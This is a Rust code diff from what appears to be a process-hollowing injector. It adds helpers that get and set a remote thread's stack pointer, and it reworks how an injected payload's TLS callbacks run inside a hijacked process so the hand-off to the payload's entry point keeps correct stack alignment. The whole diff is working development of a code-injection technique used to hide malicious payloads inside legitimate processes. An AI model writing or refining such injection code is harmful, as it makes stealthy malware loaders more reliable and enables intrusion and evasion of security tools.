@@ -591,6 +591,52 @@ fn thread_rip(thread: HANDLE) -> Result<u64, String> {
     return Ok(ctx.0.Eip as u64);
 }
 
+/// Returns the thread's current stack pointer.
+fn thread_rsp(thread: HANDLE) -> Result<u64, String> {
+    let mut ctx = AlignedContext(CONTEXT::default());
+    ctx.0.ContextFlags = CONTEXT_FLAGS_FULL;
+    let status = crate::nt_get_context_thread(
+        thread,
+        &mut ctx.0 as *mut CONTEXT as *mut core::ffi::c_void,
+    );
+    if status < 0 {
+        return Err(nt_error($MSG_GET_CONTEXT_FAILED$, status));
+    }
+    #[cfg(target_arch = "x86_64")]
+    return Ok(ctx.0.Rsp);
+    #[cfg(target_arch = "x86")]
+    return Ok(ctx.0.Esp as u64);
+}
+
+/// Writes the thread's stack pointer, leaving every other register alone.
+fn set_thread_rsp(thread: HANDLE, rsp: u64) -> Result<(), String> {
+    let mut ctx = AlignedContext(CONTEXT::default());
+    ctx.0.ContextFlags = CONTEXT_FLAGS_FULL;
+    let status = crate::nt_get_context_thread(
+        thread,
+        &mut ctx.0 as *mut CONTEXT as *mut core::ffi::c_void,
+    );
+    if status < 0 {
+        return Err(nt_error($MSG_GET_CONTEXT_FAILED$, status));
+    }
+    #[cfg(target_arch = "x86_64")]
+    {
+        ctx.0.Rsp = rsp;
+    }
+    #[cfg(target_arch = "x86")]
+    {
+        ctx.0.Esp = rsp as u32;
+    }
+    let status = crate::nt_set_context_thread(
+        thread,
+        &mut ctx.0 as *mut CONTEXT as *mut core::ffi::c_void,
+    );
+    if status < 0 {
+        return Err(nt_error($MSG_SET_CONTEXT_FAILED$, status));
+    }
+    Ok(())
+}
+
 /// Resolves `LoadLibraryA`'s address in the current process.
 ///
 /// System DLLs share one base per session, so the address is also valid in the
@@ -1094,21 +1140,38 @@ fn run_tls_callbacks(
     }
     write_remote(process, park as u64, &[0xEB, 0xFE])?;
 
+    // The thread is parked at its original entry point, which is the state the
+    // payload's entry point will be handed off in; record the stack pointer it
+    // parked with so every callback call can be based on it.
+    let parked_rsp = thread_rsp(thread)?;
+
     for (index, callback) in callbacks.iter().enumerate() {
         crate::tech_dbg!("process_hollowing", "TLS callback {index} at 0x{callback:x}");
-        run_one_callback(process, thread, park as u64, *callback, target_base)?;
+        run_one_callback(process, thread, park as u64, *callback, target_base, parked_rsp)?;
     }
+
+    // Put the stack pointer back where the target's loader left it: the hand-off
+    // to the payload's entry point keeps this context, and the entry point must
+    // see the ABI's `rsp % 16 == 8` (measured: seeing `rsp % 16 == 0` makes the
+    // payload's frames off by eight until a `movaps` of a local faults —
+    // `0xC0000005` at address `-1`).
+    set_thread_rsp(thread, parked_rsp)?;
     Ok(())
 }
 
 /// Runs one relocated TLS callback on `thread` with reason `DLL_PROCESS_ATTACH`,
 /// parking the thread on `park` (a `jmp $` stub) once the callback returns.
+///
+/// `parked_rsp` is the stack pointer the thread had when it parked; the
+/// emulated call is based on it so the callback entered through the parking
+/// stub leaves the thread's stack pointer alone.
 fn run_one_callback(
     process: HANDLE,
     thread: HANDLE,
     park: u64,
     callback: u64,
     image_base: u64,
+    parked_rsp: u64,
 ) -> Result<(), String> {
     let mut ctx = AlignedContext(CONTEXT::default());
     ctx.0.ContextFlags = CONTEXT_FLAGS_FULL;
@@ -1126,7 +1189,11 @@ fn run_one_callback(
     // travel on the stack (the callback is stdcall and cleans them itself).
     #[cfg(target_arch = "x86_64")]
     {
-        let rsp = ctx.0.Rsp.wrapping_sub(8);
+        // A `call` must be issued from a 16-byte-aligned stack pointer for the
+        // callee to enter with `rsp % 16 == 8`. The parked pointer itself can be
+        // in either phase, so round it down before the push; the eight bytes
+        // this writes below it are scratch the callback's own frame will reuse.
+        let rsp = (parked_rsp & !0xF).wrapping_sub(8);
         write_remote(process, rsp, &park.to_le_bytes())?;
         ctx.0.Rsp = rsp;
         ctx.0.Rip = callback;
@@ -1136,7 +1203,7 @@ fn run_one_callback(
     }
     #[cfg(target_arch = "x86")]
     {
-        let esp = ctx.0.Esp.wrapping_sub(16);
+        let esp = (parked_rsp as u32).wrapping_sub(16);
         let mut slots = [0u8; 16];
         // [esp] return address, [esp+4] image, [esp+8] reason, [esp+12]
         // reserved (zero, left by the initializer).
